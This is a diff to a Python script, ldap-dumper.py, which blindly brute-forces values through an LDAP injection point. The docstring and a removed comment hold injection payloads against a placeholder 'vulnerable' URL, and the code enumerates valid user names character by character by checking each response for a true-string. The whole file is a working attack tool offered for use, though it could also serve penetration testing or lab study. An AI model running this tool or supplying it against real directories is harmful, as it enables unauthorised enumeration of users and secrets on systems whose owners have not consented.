@@ -1,13 +1,17 @@
 """
-Examples:
+example:
 
-ldap-dumper.py --brute-s --true-string=AUTHENTICATED 'http://vulnerable/ldap/example2.php?name=%s)(name=*))%%00&password='
+ldap-dumper.py 'http://vulnerable/ldap/example2.php?name=%s)(name=*))%%00&password=' 'AUTHENTICATED AS'
 
-In this example, we inserted an expression into the param that will always return true if the parameter replaced by %s is true. In this case it will ennumerate all the valid users.
+In this example, we inserted an expression into the param that will always
+return true if the parameter replaced by %s is true, in this case ennumerating
+all valid users. Your mission is to get an LDAP that will return TRUE-STRING
+when %s is TRUE, and will not return it when FALSE.
 
-Your mission is to get an LDAP that will return --true-string when TRUE, and will not return it when FALSE.
+Remember to quote the URL because bash! And also remember that % needs to be escaped as %%,
+because python/printf.
 
-Remember to quote the URL! And also remember that % needs to be escaped as %%, particularly important for URL encoded strings. Also, some strings in LDAP are DN strings, which do not support wildcards.
+Some values do not support wildcards, in which case you should use --no-wildcard
 
 Plase see for more info:
 
@@ -20,9 +24,17 @@ http://www.ietf.org/rfc/rfc1960.txt
 
 import argparse, logging, string, requests
 
-def set_logging():
+def set_logging(verbosity):
+
+    if verbosity == 0:
+        logging.basicConfig(level=logging.WARNING, format="%(levelname)s - %(message)s")
+    elif verbosity == 1:
+        logging.basicConfig(level=logging.INFO, format="%(levelname)s - %(message)s")
+    else :
+        logging.basicConfig(level=logging.DEBUG, format="%(levelname)s - %(message)s")
+
     requests_log = logging.getLogger("requests")
-    logging.basicConfig(level=logging.DEBUG)
+    requests_log.setLevel(logging.WARNING)
 
 def brute_char(base_url, charset, true_string, prefix):
     valid = []
@@ -36,11 +48,8 @@ def brute_char(base_url, charset, true_string, prefix):
 
     return valid
 
-# TODO implement
-# GET 'http://vulnerable/ldap/example2.php?name=admin)(cn=a*)(cn=b*)(cn=c*)(cn=d*)(cn=e*)(cn=f*)(cn=g*)(cn=h*)(cn=i*)(cn=j*)(cn=k*)(cn=l*)(cn=m*)(cn=n*)(cn=o*)(cn=p*)(cn=q*)(cn=r*)(cn=s*)(cn=t*)(cn=u*)(cn=v*)(cn=w*)(cn=x*)(cn=y*)(cn=z*)(cn=A*)(cn=B*)(cn=C*)(cn=D*)(cn=E*)(cn=F*)(cn=G*)(cn=H*)(cn=I*)(cn=J*)(cn=K*)(cn=L*)(cn=M*)(cn=N*)(cn=O*)(cn=P*)(cn=Q*)(cn=R*)(cn=S*)(cn=T*)(cn=U*)(cn=V*)(cn=W*)(cn=X*)(cn=Y*)(cn=Z*)(cn=0*)(cn=1*)(cn=2*)(cn=3*)(cn=4*)(cn=5*)(cn=6*)(cn=7*)(cn=8*)(cn=9*)(cn=*))%00&password='
-# kind of improvement and add support for non-wildcard stuff
 def brute(base_url, true_string):
-    logging.info("Entering brute mode for URL '%s'." % base_url)
+    logging.info("Entering wildcard brute mode for URL '%s'." % base_url)
     charset = string.ascii_lowercase + string.digits
     logging.debug("Going to brute with chars %s" % charset)
 
@@ -51,7 +60,12 @@ def brute(base_url, true_string):
         if first == True:
             first = False
             exist = brute_char(base_url, charset, true_string,  "")
-            logging.info("Valid initial values found, %s", exist)
+            if exist:
+                logging.info("Valid initial values found: %s", exist)
+            else :
+                logging.warn("""No initial values found! True string was never
+                    there... Maybe attribute does not support wildcard? see --no-wildcard. Otherwise, URL is wrong.""")
+                return
         else:
             new_exist = []
             finished = True
@@ -72,36 +86,34 @@ def brute(base_url, true_string):
     return exist
 
 def succ(result):
-    print("Valid values found:")
-    print("")
-    for r in result:
-        print(r)
+    if result:
+        print("Valid values found:\n")
+        for r in result:
+            print(r)
 
 if __name__ == '__main__':
 
-    parser = argparse.ArgumentParser(description="""Grabs a vulnerable LDAP
-        injection and tests for it. Once there, it can do serveral things, like
-        blind getting values.""")
+    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,description="Bruteforces LDAP!", epilog=__doc__)
     parser.add_argument('URL', help="""The URL that is vulnerable to LDAP
-        injection, with a %%s where the injection is. Please see the __doc__ string
-        for more details.""")
-    #parser.add_argument('--brute-s', help="""If this is set to true, then %%s
-        #will be replaced with a, b, c and will bruteforce.""", action='store_true')
+        injection, with a %%s where the injection is.""")
     parser.add_argument('TRUE_STRING', help="""A string that appears in the
         response if LDAP says True. If string doesnt appear, false is assumed.""")
-    parser.add_argument('--max-path-size', help="""For bruteforcing DN names, which don't support wildcards, we create massive filters like (!(val=value1)(val=value2))[...] to be more efficient
-    in our bruteforcing. This defines how long requests will be.""")
+    parser.add_argument('--max-path-size', help="""For bruteforcing DN names,
+    which don't support wildcards, we create massive filters like
+    (!(val=value1)(val=value2))[...] to be more efficient. This defines how
+    long requests will be.""", default=8100)
     parser.add_argument('--no-wildcard', '-N', help="""Some LDAP values do not
         honor the wildcard. These need to be bruteforced without a wildcard, which
         is much slower.""", action="store_true")
+    parser.add_argument("--verbosity", "-v", type=int, help="0 warn, 1 info, 2 debug", default=1)
 
     args = parser.parse_args()
-
+    set_logging(args.verbosity)
     logging.debug(args)
 
-    set_logging()
-
-    valid_values = brute(args.URL, args.TRUE_STRING)
-
-    succ(valid_values)
+    if not args.no_wildcard:
+        valid_values = brute(args.URL, args.TRUE_STRING)
+        succ(valid_values)
+    else :
+        logging.warn("no wildcard not implemented")
 
